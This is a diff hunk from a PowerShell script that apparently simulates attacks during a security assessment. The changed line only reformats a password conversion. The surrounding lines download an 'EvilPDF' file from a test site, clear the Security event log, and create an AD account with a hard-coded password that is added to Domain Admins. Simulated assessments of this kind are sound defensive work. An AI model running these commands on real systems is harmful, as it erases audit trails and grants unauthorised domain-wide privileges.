@@ -51,7 +51,7 @@ Start-BitsTransfer -Source ($TPPSecurityTestSite + $EvilPDF) -Destination ($Fold
 "wevtutil clear-log Security" | cmd
 
 #Check for escalation
-$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String TppTestPasswordS3cur!ty
+$PASSWORD= ConvertTo-SecureString -String "TppTestPasswordS3cur!ty" -AsPlainText -Force
 New-ADUser -Name "TPPSecurityTest" -Description "An account added during the TPP security assessment.  Please delete!" -Enabled $true -AccountPassword $PASSWORD
 Add-ADGroupMember -Identity "Domain Admins" -Members TPPSecurityTest
 
